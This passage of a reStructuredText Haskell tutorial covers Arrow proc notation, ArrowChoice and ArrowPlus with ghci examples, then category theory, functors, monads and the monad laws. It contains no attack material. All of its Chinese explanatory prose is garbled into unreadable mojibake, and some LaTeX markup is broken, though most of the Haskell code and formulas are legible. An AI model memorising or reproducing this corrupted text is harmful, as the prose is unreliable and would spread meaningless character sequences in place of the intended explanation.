      .. container:: float highlight haskell
      ::

         proc x -> do 
             y <- action1 -< ... 
             z <- action2 -< ...
             returnA -< ...

      ÂÖ∂‰∏≠proc‰ª£Êõø‰∫ÜlambdaË°®ËææÂºè‰∏≠ÁöÑÊñúÊù†\\Ôºå-<Âè≥ËæπÁöÑ‰∏∫ËæìÂÖ•ÔºåÂ∑¶ËæπÁöÑ‰∏∫Êé•Êî∂ËæìÂÖ•ÁöÑÂáΩÊï∞„ÄÇÊØîÂ¶ÇÔºå‰∏ãÈù¢‰∏âÁßçÂÜôÊ≥ïËææÊàêÁöÑÊïàÊûúÊòØ‰∏ÄÊ†∑ÁöÑÔºö

      .. container:: float highlight haskell
      ::

         f :: Int -> (Int, Int)
         f = \x ->
             let y  = 2 * x
                 z1 = y + 3
                 z2 = y - 5
             in (z1, z2) 
         -- ghci> f 10 
         -- (23,15)

         fM :: Int -> Identity (Int, Int)
         fM = \x -> do
             y  <- return (2 * x)
             z1 <- return (y + 3)
             z2 <- return (y - 5)
             return (z1, z2)

         -- ghci> runIdentity (fM 10)
         -- (23,15)

         fA :: Int -> (Int, Int)
         fA = proc x -> do
             y  <- (2 *) -< x
             z1 <- (+ 3) -< y
             z2 <- (subtract 5) -< y
             returnA -< (z1, z2)

         -- ghci> fA 10
         -- (23,15)

      .. rubric:: ` <#ArrowChoice>`__ ArrowChoice
         :name: ArrowChoice

      .. container:: float highlight haskell
      ::

         class Arrow a => ArrowChoice a where
             left :: a b c -> a (Either b d) (Either c d)
             left = (+++ id)

             right :: a b c -> a (Either d b) (Either d c)
             right = (id +++)

             (+++) :: a b c -> a b' c' -> a (Either b b') (Either c c')
             f +++ g = left f >>> arr mirror >>> left g >>> arr mirror
               where
                 mirror :: Either x y -> Either y x
                 mirror (Left x) = Right x
                 mirror (Right y) = Left y

             (|||) :: a b d -> a c d -> a (Either b c) d
             f ||| g = f +++ g >>> arr untag
               where
                 untag (Left x) = x
                 untag (Right y) = y

         instance ArrowChoice (->) where
             left f = f +++ id
             right f = id +++ f
             f +++ g = (Left . f) ||| (Right . g)
             (|||) = either

         instance Monad m => ArrowChoice (Kleisli m) where
             left f = f +++ arr id
             right f = arr id +++ f
             f +++ g = (f >>> arr Left) ||| (g >>> arr Right)
             Kleisli f ||| Kleisli g = Kleisli (either f g)

      .. rubric:: ` <#ArrowZero-amp-ArrowPlus>`__ ArrowZero
         & ArrowPlus
         :name: ArrowZero-amp-ArrowPlus

      .. container:: float highlight haskell
      ::

         class Arrow a => ArrowZero a where
             zeroArrow :: a b c

         class ArrowZero a => ArrowPlus a where
             (<+>) :: a b c -> a b c -> a b c

         instance MonadPlus m => ArrowZero (Kleisli m) where
             zeroArrow = Kleisli (\_ -> mzero)

         instance MonadPlus m => ArrowPlus (Kleisli m) where
             Kleisli f <+> Kleisli g = Kleisli (\x -> f x `mplus` g x)

      .. rubric:: ` <#‰æãÂ≠ê>`__ ‰æãÂ≠ê
         :name: ‰æãÂ≠ê

      .. container:: float highlight haskell
      ::

         ghci> runKleisli ((Kleisli (\x -> [x * 2])) <+> (Kleisli (\x -> [x, -x]))) 2
         [4,2,-2]
         ghci> either (+2) (*3) (Left 3)
         5
         ghci> either (+2) (*3) (Right 3)
         9
         ghci> (+2) ||| (*3) $ (Left 3)
         5
         ghci> (+2) +++ (*3) $ (Left 3)
         Left 5
         ghci> (+2) ||| (*3) $ (Right 3)
         9
         ghci> (+2) +++ (*3) $ (Right 3)
         Right 9
         ghci> left (+2) (Left 3)
         Left 5
         ghci> right (*3) (Right 3)
         Right 9
         ghci> left (+2) (Right 3)
         Right 3
         ghci> right (*3) (Left 3)
         Left 3
         ghci> runKleisli ((Kleisli (\x -> [x * 2])) ||| (Kleisli (\x -> [x, -x]))) (Left 3)
         [6]
         ghci> runKleisli ((Kleisli (\x -> [x * 2])) ||| (Kleisli (\x -> [x, -x]))) (Right 3)
         [3,-3]
         ghci> runKleisli ((Kleisli (\x -> [x * 2])) +++ (Kleisli (\x -> [x, -x]))) (Left 3)
         [Left 6]
         ghci> runKleisli ((Kleisli (\x -> [x * 2])) +++ (Kleisli (\x -> [x, -x]))) (Right 3)
         [Right 3,Right (-3)]


   .. rubric:: ` <#Haskell‰∏éËåÉÁï¥ËÆ∫>`__ Haskell‰∏éËåÉÁï¥ËÆ∫
      :name: Haskell‰∏éËåÉÁï¥ËÆ∫

      Haskell ‰∏≠ÁöÑÂáΩÂ≠ê„ÄÅÂçïÂ≠êÁ≠âÈÉΩ‰∏éËåÉÁï¥ËÆ∫Ôºàcategory theoryÔºâÊúâÂæàÂ§öËÅîÁ≥ªÔºå
      ÊâÄ‰ª•ÊâìÁÆóÁÆÄÂçï‰∫ÜËß£‰∏Ä‰∏ãËåÉÁï¥ËÆ∫ÁöÑÁõ∏ÂÖ≥ÂÜÖÂÆπ„ÄÇ

         **ËåÉÁï¥ËÆ∫** ÊòØÊï∞Â≠¶ÁöÑ‰∏ÄÈó®Â≠¶ÁßëÔºå‰ª•ÊäΩË±°ÁöÑÊñπÊ≥ïÂ§ÑÁêÜÊï∞Â≠¶Ê¶ÇÂøµÔºåÂ∞ÜËøô‰∫õÊ¶ÇÂøµÂΩ¢ÂºèÂåñÊàê‰∏ÄÁªÑÁªÑÁöÑ‚ÄúÁâ©‰ª∂‚ÄùÂèä‚ÄúÊÄÅÂ∞Ñ‚Äù„ÄÇ
         Êï∞Â≠¶‰∏≠ËÆ∏Â§öÈáçË¶ÅÁöÑÈ¢ÜÂüüÂèØ‰ª•ÂΩ¢ÂºèÂåñ‰∏∫ËåÉÁï¥„ÄÇ‰ΩøÁî®ËåÉÁï¥ËÆ∫ÂèØ‰ª•‰ª§Ëøô‰∫õÈ¢ÜÂüü‰∏≠ËÆ∏Â§öÈöæÁêÜËß£„ÄÅÈöæÊçâÊë∏ÁöÑÊï∞Â≠¶ÁªìËÆ∫Êõ¥ÂÆπÊòìÂèôËø∞ËØÅÊòé„ÄÇ

         ‚Äî‚Äî‚Äî‚Äî Áª¥Âü∫ÁôæÁßë

      .. rubric:: ` <#ËåÉÁï¥ÔºàCategoryÔºâ>`__ ËåÉÁï¥ÔºàCategoryÔºâ
         :name: ËåÉÁï¥ÔºàCategoryÔºâ

      ËåÉÁï¥Êú¨Ë¥®‰∏äÊòØ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÈõÜÂêàÔºå‰∏Ä‰∏™ËåÉÁï¥  C  ÂåÖÂê´‰∏â‰∏™ÁªÑÊàêÊàêÂàÜÔºö

      -  ‰∏Ä‰∏™Á±ª ob(C)ÔºöÂÖ∂‰∏≠ÂÖÉÁ¥†Áß∞‰∏∫ **ÂØπË±°ÔºàobjectsÔºâ**
      -  ‰∏Ä‰∏™Á±ª hom(C)ÔºöÂÖ∂‰∏≠ÂÖÉÁ¥†Áß∞‰∏∫ **ÊÄÅÂ∞ÑÔºàmorphismsÔºâ** ÔºàÊàñ **ÁÆ≠Âè∑ÔºàarrowsÔºâ** ÔºâÔºö
         ÊØè‰∏™ÊÄÅÂ∞ÑËøûÊé•‰∫Ü‰∏§‰∏™ÂØπË±°ÔºöÊ∫êÂØπË±°Ôºàsource objectÔºâ„ÄÅÁõÆÊ†áÂØπË±°Ôºàtarget objectÔºâ„ÄÇ
         Â¶ÇÊûú ùëì ÊòØ‰ªéÊ∫êÂØπË±° A Âà∞ÁõÆÊ†áÂØπË±° B (A, B ‚àà ob(C) ÁöÑÊÄÅÂ∞ÑÔºåÈÇ£‰πàËÆ∞‰∏∫ ùëì: A -> B
      -  ‰∏Ä‰∏™‰∫åÂÖÉËøêÁÆóÔºåÁß∞‰∏∫ÊÄÅÂ∞Ñ **Â§çÂêàÔºàcompositionÔºâ** Ôºö
         ‰∏§‰∏™ÊÄÅÂ∞Ñ g: A -> B„ÄÅf: B -> C ÁöÑÂ§çÂêàËÆ∞‰∏∫ f‚àòg : A -> C
         Haskell ÂíåÂ§ßÈÉ®ÂàÜÊï∞Â≠¶ÁêÜËÆ∫‰∏≠ÈÉΩÊòØ‰ªéÂè≥ÂêëÂ∑¶ËÆ°ÁÆóÔºåÂç≥ f‚àòg ‰∏≠ÊòØÂÖàËÆ°ÁÆó g: A -> B ÂÜçËÆ°ÁÆó f: B -> C

      ËÆ∏Â§ö‰∏úË•øÈÉΩÂèØ‰ª•ÁªÑÊàêËåÉÁï¥„ÄÇÊØîÂ¶Ç:

      *  $\\mathbf{Set}$ÊòØ‰∏Ä‰∏™ËåÉÁï¥ÔºåÂØπË±°‰∏∫ÊâÄÊúâÈõÜÂêàÔºåÊÄÅÂ∞Ñ‰∏∫ÈõÜÂêà‰πãÈó¥ÁöÑÂáΩÊï∞ÔºåÂ§çÂêàÂç≥ÂáΩÊï∞‰πãÈó¥ÁöÑÂ§çÂêà
      
      | *   $\\mathbf{Grp}$ÊòØ‰∏Ä‰∏™ËåÉÁï¥ÔºåÂØπË±°‰∏∫ÊâÄÊúâÁæ§ÔºåÊÄÅÂ∞Ñ‰∏∫Áæ§ÂêåÊÄÅÔºàgroup
           homomorphismsÔºâÔºå‰æãÂ¶ÇÂØπ‰∫éÁæ§$(G,\*)$Âíå$(H,\\cdot
        )$ÔºåÊúâÁæ§ÂêåÊÄÅ$h : (G,\*)\\to (H,\\cdot
        )$ÔºåÂàôÈúÄË¶ÅÂØπ‰∫é$G$‰∏≠ÁöÑ‰ªªÊÑèÂÖÉÁ¥†$u,v$Êª°Ë∂≥
      | $$h(u*v)=h(u)\\cdot h(v)$$

      **Ê≥®ÊÑè** ÔºöÊÄÅÂ∞Ñ‰∏çÂøÖÈ°ª‰∏∫ÂáΩÊï∞ÔºõËÄå‰∏îÂèØ‰ª•Â≠òÂú®Ê∫êÂØπË±°ÂíåÁõÆÊ†áÂØπË±°ÈÉΩÁõ∏ÂêåÁöÑ‰∏çÂêåÊÄÅÂ∞Ñ

      .. rubric:: ` <#ËåÉÁï¥ÂÖ¨ÁêÜ>`__ ËåÉÁï¥ÂÖ¨ÁêÜ
         :name: ËåÉÁï¥ÂÖ¨ÁêÜ

      ÊØè‰∏™ËåÉÁï¥ÈÉΩÈúÄË¶ÅÊª°Ë∂≥‰∏âÊù°ÂÆöÂæãÔºö

      #. ÊÄÅÂ∞ÑÂ§çÂêàÈúÄË¶ÅÊª°Ë∂≥ **ÁªìÂêàÂæãÔºàassociativityÔºâ** Ôºö
      
         $$f\\circ (g\\circ h) = (f\\circ g)\\circ h$$

      #. ËåÉÁï¥Âú®Â§çÂêàÊìç‰Ωú‰∏ãÊòØ **Èó≠ÂêàÁöÑÔºàclosedÔºâ** Ôºö
         *  Â¶ÇÊûúËåÉÁï¥ C ‰∏≠Â≠òÂú®ÊÄÅÂ∞Ñ$f : B\\to C$„ÄÅ$g : A\\to B$ÔºåÈÇ£‰πàËåÉÁï¥ C ‰∏≠‰πü‰∏ÄÂÆöÂ≠òÂú®ÊÄÅÂ∞Ñ$h
         : A\\to C$Ôºå‰∏î$h=f\\circ g$
      #. ÊØè‰∏™ÂØπË±°ÈÉΩÈúÄË¶ÅÊúâ **Âçï‰ΩçÊÄÅÂ∞ÑÔºàidentity morphismsÔºâ** Ôºö
         *  ÂØπ‰∫éËåÉÁï¥ C ‰∏≠ÁöÑÂØπË±°$A$Ôºå‰∏ÄÂÆöÂ≠òÂú®Âçï‰ΩçÊÄÅÂ∞Ñ$\\mathrm{id}_A
            : A\\to A$Ôºå‰∏îÂØπ‰∫éÊØè‰∏™ÊÄÅÂ∞Ñ$g : A\\to B$Ôºå‰∏ÄÂÆöÊúâÔºö
         $$g\\circ\\mathrm{id}_A = \\mathrm{id}_B\\circ g =
         g$$

      .. rubric:: ` <#mathbf-Hask-ËåÉÁï¥>`__ $\\mathbf{Hask}$ËåÉÁï¥
         :name: mathbf-Hask-ËåÉÁï¥

      ËåÉÁï¥$\\mathbf{Hask}$ÁöÑÂØπË±°‰∏∫Haskell‰∏≠ÁöÑÁ±ªÂûãÔºàtypesÔºâÔºåÊÄÅÂ∞ÑÊòØHaskell‰∏≠ÁöÑÂáΩÊï∞ÔºåÂ§çÂêàËøêÁÆóÊòØ ``(.)`` „ÄÇÂç≥‰ªéÁ±ªÂûãAÂà∞Á±ªÂûãBÁöÑÂáΩÊï∞
      f :: A -> B
      Â∞±ÊòØ$\\mathbf{Hask}$ËåÉÁï¥‰∏≠ÁöÑ‰∏Ä‰∏™ÊÄÅÂ∞Ñ„ÄÇËÄåÂáΩÊï∞ f :: B ->
      C „ÄÅg :: A -> B ÁöÑÁªÑÂêà f . g Â∞±ÊòØ‰∏Ä‰∏™Êñ∞ÁöÑÂáΩÊï∞ h :: A
      -> C„ÄÇ

      ÂØπ‰∫é‰∏âÊù°ÂÆöÂæãÔºö

      #. Á¨¨‰∏ÄÊù°ÊòæÁÑ∂Êª°Ë∂≥Ôºöf . (g . h) = (f . g) . h

      #. Á¨¨‰∫åÊù°‰πüÊòæÁÑ∂Êª°Ë∂≥ÔºåÂ¶ÇÊûúÊúâÂáΩÊï∞ f :: B -> C „ÄÅg :: A
         -> BÔºå‰∏ÄÂÆöÊúâÂáΩÊï∞ h = (f . g) :: A -> C

      #. ÂØπ‰∫éÁ¨¨‰∏âÊù°ÂÆöÂæãÔºåHaskell‰∏≠Â≠òÂú®Âçï‰ΩçÂáΩÊï∞ id
         Ôºå‰ΩÜidÊòØÂ§öÊÄÅÔºàpolymorphicÔºâÁöÑÔºåË¶Å‰∏∫ÂÖ∂ÊåáÂÆöÁ±ªÂûã‰ΩøÂÖ∂ÂèòÊàêÂçïÊÄÅÔºàmonomorphicÔºâÁöÑ„ÄÇÊØîÂ¶ÇÊÄÅÂ∞Ñ$\\mathrm{id}_A$Âú®Haskell‰∏≠Â∞±ÂèØ‰ª•Ë°®Á§∫‰∏∫
         id :: A -> A„ÄÇÂπ∂‰∏îÊòæÁÑ∂Êª°Ë∂≥Á¨¨‰∏âÊù°ÂÆöÂæãÔºàÂÖ∂‰∏≠ f :: A
         -> BÔºâÔºö

         (id :: B -> B) . f = f . (id :: A -> A) = f

      .. rubric:: ` <#ÂáΩÂ≠êÔºàFunctorsÔºâ>`__ ÂáΩÂ≠êÔºàFunctorsÔºâ
         :name: ÂáΩÂ≠êÔºàFunctorsÔºâ

      ‰∏Ä‰∏™ËåÉÁï¥‰∏≠ÁöÑÊÄÅÂ∞ÑÂ∞Ü‰∏§‰∏™ÂØπË±°ËÅîÁ≥ªËµ∑Êù•ÔºåËÄåÂáΩÂ≠êÂàô‰ºöÂ∞Ü‰∏§‰∏™ËåÉÁï¥ËÅîÁ≥ªËµ∑Êù•„ÄÇÊç¢Âè•ËØùËØ¥ÔºåÂáΩÂ≠êÂ∞±ÊòØ‰ªé‰∏Ä‰∏™ËåÉÁï¥Âà∞Âè¶‰∏Ä‰∏™ËåÉÁï¥ÁöÑÂèòÊç¢„ÄÇÊØîÂ¶ÇÂØπ‰∫éËåÉÁï¥ C „ÄÅ$\\mathbf{D}$ÔºåÂÆö‰πâÂáΩÂ≠ê$F
      : \\mathbf{C}\\to\\mathbf{D}$Êª°Ë∂≥Ôºö

      -  ÂØπ‰∫é C ‰∏≠ÁöÑ‰ªªÊÑèÂØπË±°$A$ÔºåÂú®$\\mathbf{D}$‰∏≠ÈÉΩÊúâÂØπË±°$F(A)$
      -  ÂØπ‰∫é C ‰∏≠ÁöÑ‰ªªÊÑèÊÄÅÂ∞Ñ$f : A\\to
         B$ÔºåÂú®$\\mathbf{D}$‰∏≠ÈÉΩÊúâÊÄÅÂ∞Ñ$F(f) : F(A)\\to F(B)$

      ÊØîÂ¶ÇÔºö

      *  ÈÅóÂøòÂáΩÂ≠êÔºàforgetful functorÔºâ$U :
         \\mathbf{Grp}\\to\\mathbf{Set}$ÔºåÂ∞Ü‰∏Ä‰∏™Áæ§Êò†Â∞ÑÂà∞‰∏Ä‰∏™ÈõÜÂêà‰∏≠ÔºåÂ∞ÜÁæ§ÂêåÊÄÅÊò†Â∞ÑÂà∞ÈõÜÂêàÈó¥ÁöÑÂáΩÊï∞

      *  ÂπÇÈõÜÂáΩÂ≠êÔºàpower set functorÔºâ$P :
         \\mathbf{Set}\\to\\mathbf{Set}$ÔºåÂ∞Ü‰∏Ä‰∏™ÈõÜÂêàÊò†Â∞ÑÂà∞ÂÆÉÁöÑÂπÇÈõÜÔºåÂ∞ÜÂéüÈõÜÂêà‰∏≠ÁöÑÂáΩÊï∞$f
         : A\\to B$Êò†Â∞ÑÂà∞ÂáΩÊï∞$P(f) :
         \\mathcal{P}(A)\\to\\mathcal{P}(B)$ÔºåÂç≥‰ªé$U\\subseteq
         A$Âà∞ÂÄºÂüü$f(U)\\subseteq B$ÁöÑÊò†Â∞Ñ

      *  Ëá™ÂáΩÂ≠êÔºàendofunctorÔºâ$1\_{\\mathbf{C}} :
         \\mathbf{C}\\to\\mathbf{C}$ÔºåÂ∞Ü‰∏Ä‰∏™ËåÉÁï¥Êò†Â∞ÑÂà∞ÂÆÉÊú¨Ë∫´

      .. rubric:: ` <#ÂáΩÂ≠êÂÖ¨ÁêÜ>`__ ÂáΩÂ≠êÂÖ¨ÁêÜ
         :name: ÂáΩÂ≠êÂÖ¨ÁêÜ

      ÂáΩÂ≠ê$F :
      \\mathbf{C}\\to\\mathbf{D}$‰πüÈúÄË¶ÅÊª°Ë∂≥‰∏§‰∏™ÂÖ¨ÁêÜÔºö

      #. ÂØπ‰∫é‰ªªÊÑèÂØπË±°$X\\in\\mathbf{C}$ÔºåÊÅíÊúâ$F(\\mathrm{id}_X)=\\mathrm{id}\_{F(X)}$
      #. ÂØπ‰∫éÊÄÅÂ∞Ñ$f : Y\\to Z$„ÄÅ$g : X\\to
         Y$ÔºåÊÅíÊúâ$F(f\\circ g) = F(f)\\circ F(g)$

      .. rubric:: ` <#mathbf-Hask-ËåÉÁï¥‰∏äÁöÑÂáΩÂ≠ê>`__ $\\mathbf{Hask}$ËåÉÁï¥‰∏äÁöÑÂáΩÂ≠ê
         :name: mathbf-Hask-ËåÉÁï¥‰∏äÁöÑÂáΩÂ≠ê

      Haskell‰∏≠ÁöÑFunctorÂÆö‰πâÊòØÔºö

      .. container:: float highlight haskell
      ::

         class Functor (f :: * -> *) where 
             fmap :: (a -> b) -> f a -> f b

      ÂØπ‰∫éHaskell‰∏≠ÁöÑFunctorÔºåÂÆÉÂÆûÈôÖ‰∏äÊòØ‰ªé$\\mathbf{Hask}$ËåÉÁï¥ÔºàtypesÔºâÂà∞ÂÆÉÂ≠êËåÉÁï¥ÁöÑÂèòÊç¢„ÄÇÊØîÂ¶ÇÂàóË°®ÂáΩÂ≠ê$\\mathtt{[]}
      :
      \\mathbf{Hask}\\to\\mathbf{Lst}$ÔºàÂÖ∂‰∏≠$\\mathbf{Lst}$ÊòØÊâÄÊúâHaskell‰∏≠ÂàóË°®Á±ªÂûãÊûÑÊàêÁöÑËåÉÁï¥Ôºâ

      ÂÆÉ‰πüËææÊàê‰∫ÜËåÉÁï¥ËÆ∫‰∏≠ÂØπ‰∫éÂáΩÂ≠êÁöÑË¶ÅÊ±Ç„ÄÇÂáΩÂ≠êÈúÄË¶ÅËøõË°å‰∏§‰∏™Êìç‰ΩúÔºöÂ∞Ü‰∏Ä‰∏™ËåÉÁï¥‰∏≠ÁöÑÂØπË±°Êò†Â∞ÑÂà∞Âè¶‰∏Ä‰∏™ËåÉÁï¥‰∏≠„ÄÅÂ∞Ü‰∏Ä‰∏™ËåÉÁï¥‰∏≠ÁöÑÊÄÅÂ∞ÑÊò†Â∞ÑÂà∞Âè¶‰∏Ä‰∏™ËåÉÁï¥‰∏≠„ÄÇ‰ª•Maybe‰∏∫‰æãÔºåÂÆÉÂÆûÁé∞‰∫ÜÂáΩÂ≠êÁöÑË¶ÅÊ±ÇÔºö

      #. MaybeÊòØ‰∏Ä‰∏™Á±ªÂûãÊûÑÈÄ†Âô®Ôºå‰ªñÂèØ‰ª•Â∞Ü‰ªªÊÑèÁ±ªÂûã T
         ÂèòÊàêÊñ∞Á±ªÂûã Maybe
         TÔºåÁõ∏ÂΩì‰∫é‰ªé$\\mathbf{Hask}$ËåÉÁï¥ÁöÑÂØπË±°ÂèòÊàê‰∫Ü$\\mathbf{Maybe}$ËåÉÁï¥ÁöÑÂØπË±°
      #. fmapÂáΩÊï∞Êé•Êî∂‰∏Ä‰∏™ a -> b Á±ªÂûãÁöÑÂáΩÊï∞ÔºåËøîÂõû‰∏Ä‰∏™ Maybe
         a -> Maybe b
         Á±ªÂûãÁöÑÂáΩÊï∞ÔºåÁõ∏ÂΩì‰∫éÂ∞Ü$\\mathbf{Hask}$ËåÉÁï¥‰∏≠ÁöÑÊÄÅÂ∞Ñ$f
         : A\\to
         B$Êò†Â∞ÑÊàê‰∫Ü$\\mathbf{Maybe}$ËåÉÁï¥‰∏≠ÁöÑÊÄÅÂ∞Ñ$\\mathbf{Maybe}(f)
         : \\mathbf{Maybe}(A)\\to\\mathbf{Maybe}(B)$

      **Ê≥®ÊÑè** ÔºöÊó∂ÂàªËÆ∞‰ΩèËøôÈáåÁ†îÁ©∂ÁöÑÊòØ$\\mathbf{Hask}$ËåÉÁï¥ÂíåÂÆÉÁöÑÂ≠êËåÉÁï¥ÔºåÂØπË±°ÊòØÁ±ªÂûãËÄå‰∏çÊòØÂÄºÔºåÊÄÅÂ∞ÑÊòØÂáΩÊï∞‰πüÊåáÁöÑÊòØ‰ªéÁ±ªÂûãÂà∞Á±ªÂûã

      ÂêåÊó∂ÔºåHaskell‰∏≠ÁöÑFunctor‰πüÊª°Ë∂≥ÂáΩÂ≠êÂÖ¨ÁêÜÔºö

      #. fmap id = id Âç≥ fmap (id :: A -> A) = (id :: f A ->
         f A)
      #. fmap (f . g) = fmap f . fmap g

      .. rubric:: ` <#ÂçïÂ≠êÔºàMonadsÔºâ>`__ ÂçïÂ≠êÔºàMonadsÔºâ
         :name: ÂçïÂ≠êÔºàMonadsÔºâ

         ‰∏Ä‰∏™ÂçïÂ≠êËØ¥ÁôΩ‰∫Ü‰∏çËøáÂ∞±ÊòØËá™ÂáΩÂ≠êËåÉÁï¥‰∏äÁöÑ‰∏Ä‰∏™Âπ∫ÂçäÁæ§ËÄåÂ∑≤
         \_(:–∑„Äç‚à†)\_

      Ëá™ÂáΩÂ≠êÂú®ÂâçÈù¢ËØ¥Âà∞ËøáÊòØ‰ªé‰∏Ä‰∏™ËåÉÁï¥Âà∞Ëá™Ë∫´ÁöÑ‰∏Ä‰∏™ÂáΩÂ≠êÔºåÂ¶ÇËåÉÁï¥ C ‰∏äÁöÑËá™ÂáΩÂ≠êÊòØ$F
      :
      \\mathbf{C}\\to\\mathbf{C}$„ÄÇËá™ÂáΩÂ≠êËåÉÁï¥Â∞±ÊòØÂØπË±°ÈÉΩÊòØËá™ÂáΩÂ≠êÁöÑËåÉÁï¥„ÄÇÂπ∫ÂçäÁæ§ÂíåHaskell‰∏≠Â≠¶Âà∞ÁöÑMonoidÁ±ªÂûãÁ±ª‰∏ÄÊ†∑ÔºåÊòØ‰∏Ä‰∏™ÊúâÂèØÁªìÂêà‰∫åÂÖÉËøêÁÆóÂíåÂçï‰ΩçÂÖÉÁöÑ‰ª£Êï∞ÁªìÊûÑ„ÄÇÂõ†Ê≠§ÂçïÂ≠êÂ∞±ÊòØ‰∏Ä‰∏™Ëá™ÂáΩÂ≠êÔºåËÄå‰∏îÂÆÉÊúâÂèØÁªìÂêà‰∫åÂÖÉËøêÁÆóÔºàHaskell‰∏≠ ``>=>`` ÔºâÂíåÂçï‰ΩçÂÖÉÔºàHaskell‰∏≠ ``return`` Ôºâ„ÄÇ

      ‰∏Ä‰∏™ÂçïÂ≠ê$M :
      \\mathbf{C}\\to\\mathbf{C}$ËøòÂåÖÂê´‰∏§‰∏™ÊÄÅÂ∞ÑÔºàÂØπ‰∫éËåÉÁï¥ C ‰∏≠ÁöÑÊâÄÊúâÂØπË±°$X$ÔºâÔºö

      #. $\\mathrm{unit}_X^M : X\\to M(X)$
      #. $\\mathrm{join}_X^M : M(M(X))\\to M(X)$

      ÔºàÂΩìÂºèÂ≠ê‰∏≠ÁöÑÂçïÂ≠êÊòéÊòæÊòØ$M$Êó∂ÔºåÂèØ‰ª•ÁúÅÁï•‰∏äÊ†á${}^M$Ôºâ

      Haskell‰∏≠MonadÁöÑÂÆö‰πâÊòØÔºö

      .. container:: float highlight haskell
      ::

         class Functor m => Monad m where 
             return :: a -> m a 
             (>>=)  :: m a -> (a -> m b) -> m b

      ÂÖ∂‰∏≠ÂæàÊòæÁÑ∂Â§öÊÄÅÂáΩÊï∞ ``return`` ÂØπÂ∫î‰∫ÜÂÆö‰πâ‰∏≠ÁöÑ$\\mathrm{unit}$Ôºå‰ΩÜÊòØ ``>>=`` Âíå$mathrm{join}$ÁöÑÂØπÂ∫îÂÖ≥Á≥ªÂπ∂‰∏çÊòéÊòæ„ÄÇÂõ†Ê≠§Haskell‰∏≠Êúâ‰∏Ä‰∏™Â∑•ÂÖ∑ÂáΩÊï∞ ``join`` ÔºåÂÆÉÁöÑÊïàÊûúÂ∞±ÊòØÂÆö‰πâ‰∏≠ÁöÑ$\\mathrm{join}$ÔºåËÄå‰∏îÂÆÉÂèØ‰ª•Âíå ``>>=`` ‰∫íÁõ∏ÂÆö‰πâÔºö

      .. container:: float highlight haskell
      ::

         join :: Monad m => m (m a) -> m a
         join x = x >>= id

         (>>=) :: m a -> (a -> m b) -> m b 
         x >>= f = join $ fmap f x

      ÊâÄ‰ª•Haskell‰∏≠‰∏∫MonadË¶ÅÊ±ÇÂÆö‰πâ ``>>=`` Â∞±Áõ∏ÂΩì‰∫éÂÆö‰πâ‰∫Ü$\\mathrm{join}$

      ‰æãÂ¶ÇÔºåÂπÇÈõÜÂáΩÂ≠ê$P :
      \\mathbf{Set}\\to\\mathbf{Set}$‰πüÊòØ‰∏Ä‰∏™ÂçïÂ≠êÔºåÂèØ‰ª•‰∏∫ÂÆÉÂÆö‰πâ$\\mathrm{unit}$Âíå$\\mathrm{join}$‰∏§‰∏™ÊÄÅÂ∞Ñ„ÄÇHaskell‰∏≠ÁöÑÂàóË°®‰πüÂèØ‰ª•Ëøë‰ººÁúã‰ΩúÂπÇÈõÜÂáΩÂ≠ê„ÄÇ

      *  ÊÄÅÂ∞Ñ/ÂáΩÊï∞ÁöÑÁ±ªÂûãÔºö
      
      .. list-table::
         :header-rows: 1

         - 

            - ÂπÇÈõÜÂáΩÂ≠ê
            - Haskell‰∏≠ÂàóË°®
         - 

            - ‰∏Ä‰∏™ÈõÜÂêà$S$Âíå‰∏Ä‰∏™ÊÄÅÂ∞Ñ$f : A\\to B$
            - ‰∏Ä‰∏™Á±ªÂûã T Âíå‰∏Ä‰∏™ÂáΩÊï∞ f :: A -> B
         - 

            - $P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)$
            - fmap f :: [A] -> [B]
         - 

            - $\\mathrm{unit}_S : S\\to\\mathcal{P}(S)$
            - return :: T -> [T]
         - 

            - $\\mathrm{join}_S :
               \\mathcal{P}(\\mathcal{P}(S))\\to\\mathcal{P}(S)$
            - join :: [[T]] -> [T]

      *  ÊÄÅÂ∞Ñ/ÂáΩÊï∞ÁöÑÂÆö‰πâÔºö
      
      .. list-table::
         :header-rows: 1

         - 

            - ÂπÇÈõÜÂáΩÂ≠ê
            - Haskell‰∏≠ÂàóË°®
         - 

            - $(\\mathcal{P}(f))(S) = \\{f(a):a\\in S\\}$
            - fmap f xs = [ f a \| a <- xs ]
         - 

            - $\\mathrm{unit}_S(x) = \\{x\\}$
            - return x = [x]
         - 

            - $\\mathrm{join}_S(L) = \\bigcup L$
            - join xs = concat xs

      .. rubric:: ` <#ÂçïÂ≠êÂÖ¨ÁêÜ>`__ ÂçïÂ≠êÂÖ¨ÁêÜ
         :name: ÂçïÂ≠êÂÖ¨ÁêÜ

      ÁªôÂÆö‰∏Ä‰∏™ÂçïÂ≠ê$M :
      \\mathbf{C}\\to\\mathbf{C}$ÔºåÂíå‰∏Ä‰∏™ÊÄÅÂ∞Ñ$f : A\\to
      B$ÔºàÂÖ∂‰∏≠$A,B\\in
      \\mathbf{C}$ÔºâÔºåÈÇ£‰πàÊª°Ë∂≥‰∏ãÈù¢ÂõõÊù°ÂÆöÂæãÔºö

      #. $\\mathrm{join}\\circ
         M(\\mathrm{join})=\\mathrm{join}\\circ\\mathrm{join}$
      #. $\\mathrm{join}\\circ
         M(\\mathrm{unit})=\\mathrm{join}\\circ\\mathrm{unit}=\\mathrm{id}$
      #. $\\mathrm{unit}\\circ f = M(f)\\circ\\mathrm{unit}$
      #. $\\mathrm{join}\\circ M(M(f)) =
         M(f)\\circ\\mathrm{join}$

      ‰πüÂèØ‰ª•ÂæàËá™ÁÑ∂Âú∞Â∞ÜÂÖ∂ËΩ¨Âåñ‰∏∫Haskell‰∏≠ÁöÑË°®Ëø∞Ôºö

      #. join . fmap join ``=`` join . join
      #. join . fmap return ``=`` join . return ``=`` id
      #. return . f ``=`` fmap f . return
      #. join . fmap (fmap f) ``=`` fmap f . join

      Âú®Haskell‰∏≠Ôºå‰ΩøÁî® ``>>=`` ‰πüÊúâ‰∏â‰∏™ÂÆöÂæãÂíåËøôÂõõ‰∏™ÂÆöÂæãÊòØÁ≠â‰ª∑ÁöÑÔºö

      #. return x >>= f ``=`` f x

         .. container:: float highlight haskell
         ::

              return x >>= f 
            = join (fmap f (return x)) = join (fmap f . return $ x)
            = join (return (f x)) = join (return . f $ x)
            = join . return $ (f x)
            = id (f x)
            = f x

      #. m >>= return ``=`` m

         .. container:: float highlight haskell
         ::

              m >>= return 
            = join (fmap return m) = join . fmap return $ m 
            = id m
            = m 

      #. (m >>= f) >>= g ``=`` m >>= (\\x -> f x >>= g)

